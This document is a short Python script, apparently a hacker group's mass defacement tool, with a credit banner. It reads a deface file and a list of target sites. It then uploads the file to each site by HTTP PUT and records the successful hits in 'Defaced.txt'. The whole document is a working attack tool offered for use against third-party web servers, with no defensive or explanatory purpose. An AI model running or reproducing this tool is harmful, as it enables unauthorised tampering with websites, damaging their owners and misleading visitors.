try:
   import requests
   import os.path
   import sys
except ImportError:
   exit("install requests and try again ...")

banner = """
\033[1;92m_____         ___  ___ ______  _____ _    _
\033[1;91m|_   _|        |  \/  | | ___ \/  __ \ |  | |
\033[1;92m  | | ___  __ _| .  . | | |_/ /| /  \/ |  | |
\033[1;91m  | |/ _ \/ _` | |\/| | | ___ \| |   | |/\| |
\033[1;92m  | |  __/ (_| | |  | | | |_/ /| \__/\  /\  /
\033[1;91m  \_/\___|\__,_\_|  |_/ \____/  \____/\/  \/
\033[1;92m                    ______                  
\033[1;91m                   |______|
+++++++++++++++++++++++
+[Coded By Athro Haque]
+++++++++++++++++++++++

 """

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)
   
   return str(ipt)

def aox(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("uploading file to %d website"%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" FAILED!"+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+h+" SUCCESS"+m+" ] %s/%s"%(site,script))
               bisa = "%s/%s"%(site,script)
               open('Defaced.txt', 'a').write(bisa+"\n")

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x("Enter your script deface name: ")
         if not os.path.isfile(a):
            print("file '%s' not found"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   aox(a)

if __name__ == "__main__":
    main(banner)
